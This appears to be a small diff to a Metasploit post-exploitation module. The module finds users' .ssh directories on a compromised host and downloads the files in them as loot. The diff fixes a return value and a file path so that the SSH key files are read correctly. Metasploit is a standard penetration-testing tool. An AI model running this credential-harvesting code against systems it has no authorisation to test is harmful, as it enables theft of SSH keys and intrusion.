@@ -129,7 +129,7 @@ class Metasploit3 < Msf::Post
 				next if sshfile =~ /No such file/i
 
 				print_status("Found .ssh directory for: #{id}")
-				return sshfile
+				return [sshfile]
 			end
 			return
 		end
@@ -181,7 +181,7 @@ class Metasploit3 < Msf::Post
 				files.each_line do |file|
 					file.chomp!
 					print_good("Downloading #{path}/#{file}")
-					data = read_file(file)
+					data = read_file("#{path}/#{file}")
 					file = file.split('/').last
 					store_loot("ssh.#{file}", "text/plain", session, data, "ssh_#{file}", "OpenSSH #{file} File")
 				end
